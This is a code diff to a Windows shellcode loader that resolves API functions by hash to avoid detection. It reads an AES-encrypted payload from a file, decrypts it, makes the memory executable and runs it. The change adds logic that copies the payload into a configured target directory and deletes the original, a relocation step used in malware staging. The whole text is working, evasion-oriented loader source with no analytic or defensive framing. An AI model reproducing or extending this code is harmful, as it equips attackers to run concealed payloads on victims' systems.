@@ -8,6 +8,7 @@ struct {
     int len;
     int offset;
     char file[_MAX_PATH];
+	char targetDir[_MAX_PATH];
 } sc = { "Hello, World!" };
 
 #define Kernel32Lib_Hash 0x1cca9ce6
@@ -39,6 +40,12 @@ typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, D
 
 #define ReadFile_Hash 990362902
 typedef BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+
+#define DeleteFileA_Hash 161619550
+typedef BOOL(WINAPI* _DeleteFileA)(LPCSTR lpFileName);
+
+#define CopyFileA_Hash 524124328
+typedef BOOL(WINAPI* _CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
 
 #define CloseHandle_Hash 110641196
 typedef BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
@@ -219,6 +226,16 @@ void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAdd
     return 0;
 }
 
+char* strstr(const char* h, const char* n) {
+    if (!*n) return (char*)h;
+    for (; *h; h++) {
+        const char* p = h, * q = n;
+        while (*p && *q && *p == *q) p++, q++;
+        if (!*q) return (char*)h;
+    }
+    return NULL;
+}
+
 // A simple shell code loader.
 // Copy left (c) yuanyuanxiang.
 #ifdef _DEBUG
@@ -227,7 +244,7 @@ void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAdd
 int entry()
 {
     HMODULE kernel32 = get_kernel32_base();
-    if (!kernel32) return 1;
+    if (!kernel32) return(1);
     _GetProcAddress GetProcAddress = (_GetProcAddress)get_proc_address_from_hash(kernel32, GetProcAddress_Hash, 0);
     _LoadLibraryA LoadLibraryA = (_LoadLibraryA)get_proc_address_from_hash(kernel32, LoadLibraryA_Hash, GetProcAddress);
     _VirtualAlloc VirtualAlloc = (_VirtualAlloc)get_proc_address_from_hash(kernel32, VirtualAlloc_Hash, GetProcAddress);
@@ -237,24 +254,40 @@ int entry()
     _CreateFileA CreateFileA = (_CreateFileA)get_proc_address_from_hash(kernel32, CreateFileA_Hash, GetProcAddress);
     _SetFilePointer SetFilePointer = (_SetFilePointer)get_proc_address_from_hash(kernel32, SetFilePointer_Hash, GetProcAddress);
     _ReadFile ReadFile = (_ReadFile)get_proc_address_from_hash(kernel32, ReadFile_Hash, GetProcAddress);
+	_DeleteFileA DeleteFileA = (_DeleteFileA)get_proc_address_from_hash(kernel32, DeleteFileA_Hash, GetProcAddress);
+	_CopyFileA CopyFileA = (_CopyFileA)get_proc_address_from_hash(kernel32, CopyFileA_Hash, GetProcAddress);
     _CloseHandle CloseHandle = (_CloseHandle)get_proc_address_from_hash(kernel32, CloseHandle_Hash, GetProcAddress);
 
     if (!sc.file[0]) GetModulePath(NULL, sc.file, MAX_PATH);
-    HANDLE hFile = CreateFileA(sc.file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return 2;
+    char* file = sc.file, dstFile[2 * MAX_PATH];
+    if (sc.targetDir[0]) {
+        char curExe[MAX_PATH], * p = dstFile, * dir = sc.targetDir;
+        GetModulePath(NULL, curExe, MAX_PATH);
+        while (*dir) *p++ = *dir++; *p++ = '\\';
+        while (*file) *p++ = *file++; *p = '\0';
+        file = dstFile;
+        if (!strstr(curExe, sc.targetDir)) {
+            DeleteFileA(dstFile);
+            BOOL b = CopyFileA(sc.file, dstFile, FALSE);
+            DeleteFileA(sc.file);
+            if (!b) return(2);
+        }
+    }
+    HANDLE hFile = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return(3);
     SetFilePointer(hFile, (LONG)sc.offset, NULL, FILE_BEGIN);
     DWORD bytesRead = 0;
     sc.data = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!ReadFile(hFile, sc.data, sc.len, &bytesRead, NULL)) return 3;
+    if (!ReadFile(hFile, sc.data, sc.len, &bytesRead, NULL)) return(4);
     CloseHandle(hFile);
-    if (!sc.data || !sc.len) return 4;
+    if (!sc.data || !sc.len) return(5);
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, sc.aes_key, sc.aes_iv);
     AES_CBC_decrypt_buffer(&ctx, sc.data, sc.len);
     DWORD oldProtect = 0;
-    if (!VirtualProtect(sc.data, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return 5;
+    if (!VirtualProtect(sc.data, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return(6);
     ((void(*)())sc.data)();
     Sleep(INFINITE);
 
-    return 0;
+    return(0);
 }
